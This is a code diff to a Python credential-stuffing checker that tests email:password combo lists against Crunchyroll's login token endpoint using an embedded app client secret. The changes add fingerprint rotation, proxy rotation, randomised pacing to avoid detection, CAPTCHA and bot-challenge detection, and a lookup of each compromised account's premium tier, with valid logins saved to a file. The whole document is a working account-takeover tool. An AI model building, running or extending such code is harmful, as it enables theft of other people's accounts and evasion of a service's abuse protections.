@@ -19,26 +19,48 @@ import uuid
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import dataclass
 from enum import Enum
-from typing import Callable, Dict, Iterable, List, Optional
+from typing import Callable, Dict, Iterable, Iterator, List, Optional
 
 import requests
 from colorama import Fore, Style, init
 
 init(autoreset=False)
 
-# Android TV client: password grant works on beta-api. Mobile app credentials often return unsupported_grant_type.
-# If invalid_client: refresh Basic token (crextractor credentials.tv.json) or set CRUNCHYROLL_AUTH.
 DEFAULT_AUTH_HEADER = (
     "Basic bzd1b3d5N3E0bGdsdGJhdnloanE6bHFyakVUTng2Vzd1Um5wY0RtOHdSVmo4QkNoakMxZXI="
 )
 TOKEN_URL = "https://beta-api.crunchyroll.com/auth/v1/token"
+ACCOUNTS_ME_URL = "https://beta-api.crunchyroll.com/accounts/v1/me"
 APP_VERSION = "3.58.0"
 ANDROID_TV_BUILD = "22336"
 REQUEST_TIMEOUT = 30
 
+# Rotate User-Agent / client fingerprints (Android TV + mobile app style).
 USER_AGENTS = [
     f"Crunchyroll/{APP_VERSION} ANDROIDTV/{ANDROID_TV_BUILD}",
+    f"Crunchyroll/{APP_VERSION} android/13",
+    f"Crunchyroll/{APP_VERSION} okhttp/4.12.0",
+    "Mozilla/5.0 (Linux; Android 13; TV) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36 Crunchyroll",
 ]
+
+ACCEPT_LANGS = [
+    "en-US,en;q=0.9",
+    "en-GB,en;q=0.9",
+    "en-US,en;q=0.9,es;q=0.5",
+]
+
+# 429 retries: wait 2s, 4s, 8s, 16s, 32s (max 5 retries after first 429).
+BACKOFF_429_SEC = [2, 4, 8, 16, 32]
+
+# Inter-check delay range (seconds); avoids fixed patterns.
+DELAY_MIN_SEC = 1.5
+DELAY_MAX_SEC = 5.0
+
+# Rotate proxy every N successful line starts (randomized per run).
+PROXY_ROTATE_MIN = 3
+PROXY_ROTATE_MAX = 6
+
+MAX_ACCOUNTS_PER_RUN = 300
 
 
 def _authorization_header() -> str:
@@ -58,6 +80,7 @@ class CheckResult:
     email: str
     password: str
     message: str = ""
+    subscription: str = ""
 
     @property
     def combo(self) -> str:
@@ -85,20 +108,84 @@ def _normalize_proxy_url(url: str) -> str:
     return u
 
 
+def _proxy_dict_from_url(url: Optional[str]) -> Optional[Dict[str, str]]:
+    if not url:
+        return None
+    u = _normalize_proxy_url(url)
+    if not u:
+        return None
+    return {"http": u, "https": u}
+
+
+def _random_browser_headers(auth: str) -> dict[str, str]:
+    if not auth.lower().startswith("basic "):
+        auth = f"Basic {auth}"
+    return {
+        "Authorization": auth,
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": random.choice(USER_AGENTS),
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": random.choice(ACCEPT_LANGS),
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "keep-alive",
+        "Cache-Control": "no-cache",
+    }
+
+
+def _fetch_subscription_label(sess: requests.Session, access_token: str) -> str:
+    try:
+        r = sess.get(
+            ACCOUNTS_ME_URL,
+            headers={
+                "Authorization": f"Bearer {access_token}",
+                "Accept": "application/json",
+                "User-Agent": random.choice(USER_AGENTS),
+            },
+            timeout=20,
+        )
+        if r.status_code != 200:
+            return "Active"
+        data = r.json()
+        if not isinstance(data, dict):
+            return "Active"
+        if data.get("premium") is True or data.get("is_premium") is True:
+            return "Premium"
+        sub = data.get("subscription") or data.get("membership") or data.get("tier")
+        if isinstance(sub, dict):
+            name = sub.get("tier") or sub.get("plan") or sub.get("name")
+            if name:
+                return str(name)
+        if isinstance(sub, str) and sub:
+            return sub
+        # Heuristic from nested CRM / account flags
+        ext = str(data).lower()
+        if "premium" in ext or "mega_fan" in ext or "fan_membership" in ext:
+            return "Premium"
+        if "free" in ext and "premium" not in ext:
+            return "Free"
+        return "Active"
+    except (requests.RequestException, ValueError, TypeError, json.JSONDecodeError):
+        return "Active"
+
+
 def check_credentials(
     email: str,
     password: str,
     proxies: Optional[Dict[str, str]] = None,
-    extra_delay: float = 0.0,
+    session: Optional[requests.Session] = None,
 ) -> CheckResult:
     """
-    POST auth/v1/token with grant_type=password (Crunchyroll beta API).
-    ``proxies`` is passed to requests (e.g. {"http": "http://host:port", "https": "http://host:port"}).
+    POST auth/v1/token. Reuses ``session`` for cookies; creates one if omitted.
+    Retries on HTTP 429 with exponential backoff. Detects CAPTCHA / odd redirects.
     """
     email = email.strip()
     password = password.strip()
     if not email or not password:
-        return CheckResult(CheckStatus.BAD_FORMAT, email, password, "empty email or password")
+        return CheckResult(CheckStatus.BAD_FORMAT, email, password, "empty email or password", "")
+
+    sess = session or requests.Session()
+    if proxies:
+        sess.proxies.update(proxies)
 
     device_id = str(uuid.uuid4())
     payload = {
@@ -111,49 +198,70 @@ def check_credentials(
         "device_type": "Android TV",
     }
     auth = _authorization_header()
-    if not auth.lower().startswith("basic "):
-        auth = f"Basic {auth}"
 
-    headers = {
-        "Authorization": auth,
-        "Content-Type": "application/x-www-form-urlencoded",
-        "User-Agent": random.choice(USER_AGENTS),
-        "Accept": "application/json",
-    }
+    response: Optional[requests.Response] = None
+    for attempt in range(6):
+        headers = _random_browser_headers(auth)
+        try:
+            response = sess.post(
+                TOKEN_URL,
+                data=payload,
+                headers=headers,
+                timeout=REQUEST_TIMEOUT,
+                allow_redirects=True,
+            )
+        except requests.RequestException as e:
+            return CheckResult(CheckStatus.ERROR, email, password, str(e), "")
 
-    try:
-        response = requests.post(
-            TOKEN_URL,
-            data=payload,
-            headers=headers,
-            timeout=REQUEST_TIMEOUT,
-            proxies=proxies,
-        )
-    except requests.RequestException as e:
-        return CheckResult(CheckStatus.ERROR, email, password, str(e))
+        if response.status_code == 429:
+            if attempt < 5:
+                time.sleep(BACKOFF_429_SEC[attempt] + random.uniform(0.0, 0.5))
+                continue
+            return CheckResult(
+                CheckStatus.ERROR,
+                email,
+                password,
+                "HTTP 429 Too Many Requests (max retries)",
+                "",
+            )
+        break
 
-    time.sleep(random.uniform(0.4, 1.2) + max(0.0, extra_delay))
+    assert response is not None
+    r = response
 
-    if response.status_code == 429:
+    if len(r.history) > 3:
         return CheckResult(
             CheckStatus.ERROR,
             email,
             password,
-            "HTTP 429 Too Many Requests (slow down: -t 1, --delay 5, or --proxy / --proxies-file)",
+            f"Unusual redirect chain ({len(r.history)} hops)",
+            "",
+        )
+
+    raw_text = (r.text or "").lower()
+    if "captcha" in raw_text or "cf-challenge" in raw_text or "challenge-platform" in raw_text:
+        return CheckResult(
+            CheckStatus.ERROR,
+            email,
+            password,
+            "Possible CAPTCHA or bot challenge — pause and retry later",
+            "",
         )
 
     try:
-        body = response.json()
+        body = r.json()
     except (json.JSONDecodeError, ValueError):
         return CheckResult(
             CheckStatus.ERROR,
             email,
             password,
-            f"non-JSON response HTTP {response.status_code}",
+            f"non-JSON response HTTP {r.status_code}",
+            "",
         )
 
-    if response.status_code == 200 and isinstance(body, dict) and body.get("access_token"):
-        return CheckResult(CheckStatus.VALID, email, password)
+    if r.status_code == 200 and isinstance(body, dict) and body.get("access_token"):
+        sub = _fetch_subscription_label(sess, str(body["access_token"]))
+        return CheckResult(CheckStatus.VALID, email, password, "", sub)
 
     err = ""
     if isinstance(body, dict):
@@ -170,6 +278,7 @@ def check_credentials(
             email,
             password,
             "invalid_client (update CRUNCHYROLL_AUTH - see bot.py header comment)",
+            "",
         )
 
     if "unsupported_grant_type" in low:
@@ -178,42 +287,88 @@ def check_credentials(
             email,
             password,
             "unsupported_grant_type (wrong OAuth client; this script expects Android TV credentials)",
+            "",
         )
 
     if (
         any(x in low for x in ("invalid_grant", "invalid_credentials", "incorrect"))
         or "invalid_credentials" in low
-        or response.status_code == 401
+        or r.status_code == 401
     ):
-        return CheckResult(CheckStatus.INVALID, email, password, err or f"HTTP {response.status_code}")
+        return CheckResult(CheckStatus.INVALID, email, password, err or f"HTTP {r.status_code}", "")
 
-    if response.status_code >= 500 or "cloudflare" in str(body).lower():
+    if r.status_code >= 500 or "cloudflare" in str(body).lower():
         return CheckResult(
             CheckStatus.ERROR,
             email,
             password,
-            err or f"HTTP {response.status_code} (server or protection)",
+            err or f"HTTP {r.status_code} (server or protection)",
+            "",
         )
 
-    return CheckResult(CheckStatus.INVALID, email, password, err or f"HTTP {response.status_code}")
+    return CheckResult(CheckStatus.INVALID, email, password, err or f"HTTP {r.status_code}", "")
 
 
 def check_combo_line(
     line: str,
-    proxy_urls: Optional[List[str]] = None,
+    proxy_url: Optional[str] = None,
     extra_delay: float = 0.0,
 ) -> CheckResult:
     line = line.strip()
     if ":" not in line:
-        return CheckResult(CheckStatus.BAD_FORMAT, "", "", f"invalid format: {line!r}")
+        return CheckResult(CheckStatus.BAD_FORMAT, "", "", f"invalid format: {line!r}", "")
     email, password = line.split(":", 1)
-    proxies: Optional[Dict[str, str]] = None
-    if proxy_urls:
-        cleaned = [_normalize_proxy_url(u) for u in proxy_urls if _normalize_proxy_url(u)]
+    proxies = _proxy_dict_from_url(proxy_url)
+    sess = requests.Session()
+    if proxies:
+        sess.proxies.update(proxies)
+    result = check_credentials(email, password, proxies=proxies, session=sess)
+    if extra_delay > 0:
+        time.sleep(extra_delay * random.uniform(0.85, 1.15))
+    return result
+
+
+def _clip_lines(combos: Iterable[str], max_n: int = MAX_ACCOUNTS_PER_RUN) -> List[str]:
+    out: List[str] = []
+    for c in combos:
+        s = str(c).strip()
+        if s:
+            out.append(s)
+        if len(out) >= max_n:
+            break
+    return out
+
+
+def iter_checks_sequential(
+    combos: Iterable[str],
+    proxy_urls: Optional[List[str]] = None,
+    extra_delay: float = 0.0,
+) -> Iterator[CheckResult]:
+    """
+    One account at a time (no parallel bursts). Random pause between checks.
+    Rotates proxy every few lines and on errors when proxies are configured.
+    """
+    lines = _clip_lines(combos, MAX_ACCOUNTS_PER_RUN)
+    cleaned = [_normalize_proxy_url(u) for u in (proxy_urls or []) if _normalize_proxy_url(u)]
+    rotate_every = random.randint(PROXY_ROTATE_MIN, PROXY_ROTATE_MAX)
+    idx = 0
+
+    for i, line in enumerate(lines):
+        if i > 0:
+            time.sleep(random.uniform(DELAY_MIN_SEC, DELAY_MAX_SEC) + max(0.0, extra_delay))
+
+        purl: Optional[str] = None
         if cleaned:
-            u = random.choice(cleaned)
-            proxies = {"http": u, "https": u}
-    return check_credentials(email, password, proxies=proxies, extra_delay=extra_delay)
+            if i > 0 and i % rotate_every == 0:
+                idx = (idx + 1) % len(cleaned)
+            purl = cleaned[idx]
+
+        result = check_combo_line(line, proxy_url=purl, extra_delay=0.0)
+
+        if result.status == CheckStatus.ERROR and cleaned:
+            idx = (idx + 1) % len(cleaned)
+
+        yield result
 
 
 @dataclass
@@ -227,6 +382,24 @@ class RunSummary:
     valid_lines: List[str]
 
 
+def build_summary(results: List[CheckResult], elapsed: float) -> RunSummary:
+    counts = {CheckStatus.VALID: 0, CheckStatus.INVALID: 0, CheckStatus.ERROR: 0, CheckStatus.BAD_FORMAT: 0}
+    valid_lines: List[str] = []
+    for r in results:
+        counts[r.status] = counts.get(r.status, 0) + 1
+        if r.status == CheckStatus.VALID:
+            valid_lines.append(r.combo)
+    return RunSummary(
+        total=len(results),
+        valid=counts[CheckStatus.VALID],
+        invalid=counts[CheckStatus.INVALID],
+        errors=counts[CheckStatus.ERROR],
+        bad_format=counts[CheckStatus.BAD_FORMAT],
+        seconds=elapsed,
+        valid_lines=valid_lines,
+    )
+
+
 def run_checks(
     combos: Iterable[str],
     max_workers: int,
@@ -234,16 +407,21 @@ def run_checks(
     proxy_urls: Optional[List[str]] = None,
     extra_delay: float = 0.0,
 ) -> RunSummary:
-    combos_list = [c for c in combos if c and str(c).strip()]
+    """Parallel checker (CLI). Caps workers at 2 for lighter load."""
+    combos_list = _clip_lines(combos, MAX_ACCOUNTS_PER_RUN)
     valid_lines: List[str] = []
     counts = {CheckStatus.VALID: 0, CheckStatus.INVALID: 0, CheckStatus.ERROR: 0, CheckStatus.BAD_FORMAT: 0}
+    workers = max(1, min(2, max_workers))
 
+    cleaned = [_normalize_proxy_url(u) for u in (proxy_urls or []) if _normalize_proxy_url(u)]
     start = time.perf_counter()
-    with ThreadPoolExecutor(max_workers=max_workers) as executor:
-        futures = {
-            executor.submit(check_combo_line, line, proxy_urls, extra_delay): line
-            for line in combos_list
-        }
+
+    def work(line: str) -> CheckResult:
+        pu = random.choice(cleaned) if cleaned else None
+        return check_combo_line(line, proxy_url=pu, extra_delay=extra_delay)
+
+    with ThreadPoolExecutor(max_workers=workers) as executor:
+        futures = {executor.submit(work, line): line for line in combos_list}
         for fut in as_completed(futures):
             result = fut.result()
             counts[result.status] = counts.get(result.status, 0) + 1
@@ -270,20 +448,12 @@ def run_checks_collecting(
     proxy_urls: Optional[List[str]] = None,
     extra_delay: float = 0.0,
 ) -> tuple[RunSummary, List[CheckResult]]:
-    """Same as run_checks but returns every CheckResult (completion order)."""
-    collected: List[CheckResult] = []
-
-    def on_result(r: CheckResult) -> None:
-        collected.append(r)
-
-    summary = run_checks(
-        combos,
-        max_workers,
-        on_result=on_result,
-        proxy_urls=proxy_urls,
-        extra_delay=extra_delay,
-    )
-    return summary, collected
+    """API default: sequential human-like pacing (ignores max_workers for ordering)."""
+    start = time.perf_counter()
+    results = list(iter_checks_sequential(combos, proxy_urls, extra_delay))
+    elapsed = time.perf_counter() - start
+    summary = build_summary(results, elapsed)
+    return summary, results
 
 
 def check_result_to_dict(r: CheckResult) -> dict:
@@ -293,6 +463,7 @@ def check_result_to_dict(r: CheckResult) -> dict:
         "password": r.password,
         "message": r.message,
         "combo": r.combo,
+        "subscription": r.subscription or "",
     }
 
 
@@ -302,7 +473,8 @@ def format_result_line(result: CheckResult) -> str:
     if result.status == CheckStatus.ERROR:
         return f"{Fore.YELLOW}[ERROR] {result.email}:{result.password} - {result.message}{Style.RESET_ALL}"
     if result.status == CheckStatus.VALID:
-        return f"{Fore.GREEN}[VALID] {result.combo}{Style.RESET_ALL}"
+        sub = f" [{result.subscription}]" if result.subscription else ""
+        return f"{Fore.GREEN}[VALID] {result.combo}{sub}{Style.RESET_ALL}"
     extra = f" ({result.message})" if result.message else ""
     return f"{Fore.RED}[INVALID] {result.combo}{extra}{Style.RESET_ALL}"
 
@@ -328,8 +500,8 @@ def parse_args(argv: Optional[List[str]] = None) -> argparse.Namespace:
         "-t",
         "--threads",
         type=int,
-        default=5,
-        help="Worker threads (1-10). Default: 5",
+        default=2,
+        help="Worker threads for parallel mode (1-2). Default: 2",
     )
     p.add_argument(
         "-o",
@@ -361,7 +533,12 @@ def parse_args(argv: Optional[List[str]] = None) -> argparse.Namespace:
         type=float,
         default=0.0,
         metavar="SEC",
-        help="Extra seconds to wait after each request (helps with 429). Default: 0",
+        help="Extra seconds added to random inter-check delay. Default: 0",
+    )
+    p.add_argument(
+        "--sequential",
+        action="store_true",
+        help="One check at a time with random pauses (slower, gentler on APIs).",
     )
     return p.parse_args(argv)
 
@@ -385,8 +562,6 @@ def main(argv: Optional[List[str]] = None) -> int:
     with open(combo_file, "r", encoding="utf-8", errors="replace") as f:
         combos = [line.strip() for line in f if line.strip()]
 
-    threads = max(1, min(10, args.threads))
-
     proxy_urls: List[str] = list(args.proxies or [])
     if args.proxies_file:
         if not os.path.isfile(args.proxies_file):
@@ -399,21 +574,37 @@ def main(argv: Optional[List[str]] = None) -> int:
     if proxy_urls:
         print(f"{Fore.BLUE}[INFO] Using {len(proxy_urls)} proxy URL(s){Style.RESET_ALL}")
     if args.delay > 0:
-        print(f"{Fore.BLUE}[INFO] Extra delay after each check: {args.delay}s{Style.RESET_ALL}")
+        print(f"{Fore.BLUE}[INFO] Extra delay add-on: {args.delay}s per gap{Style.RESET_ALL}")
 
-    print(f"{Fore.BLUE}[INFO] Loaded {len(combos)} lines - using {threads} threads{Style.RESET_ALL}")
+    if len(combos) > MAX_ACCOUNTS_PER_RUN:
+        print(
+            f"{Fore.YELLOW}[WARN] Only first {MAX_ACCOUNTS_PER_RUN} lines will be processed.{Style.RESET_ALL}"
+        )
+        combos = combos[:MAX_ACCOUNTS_PER_RUN]
 
     def on_result(result: CheckResult) -> None:
         if not args.quiet:
             print(format_result_line(result))
 
-    summary = run_checks(
-        combos,
-        threads,
-        on_result=on_result,
-        proxy_urls=proxy_urls or None,
-        extra_delay=args.delay,
-    )
+    if args.sequential:
+        print(f"{Fore.BLUE}[INFO] Sequential mode · {len(combos)} lines{Style.RESET_ALL}")
+        start = time.perf_counter()
+        collected: List[CheckResult] = []
+        for r in iter_checks_sequential(combos, proxy_urls or None, args.delay):
+            collected.append(r)
+            on_result(r)
+        elapsed = time.perf_counter() - start
+        summary = build_summary(collected, elapsed)
+    else:
+        threads = max(1, min(2, args.threads))
+        print(f"{Fore.BLUE}[INFO] Loaded {len(combos)} lines — parallel workers: {threads}{Style.RESET_ALL}")
+        summary = run_checks(
+            combos,
+            threads,
+            on_result=on_result,
+            proxy_urls=proxy_urls or None,
+            extra_delay=args.delay,
+        )
 
     if summary.valid_lines:
         write_valid_file(args.output, summary.valid_lines)
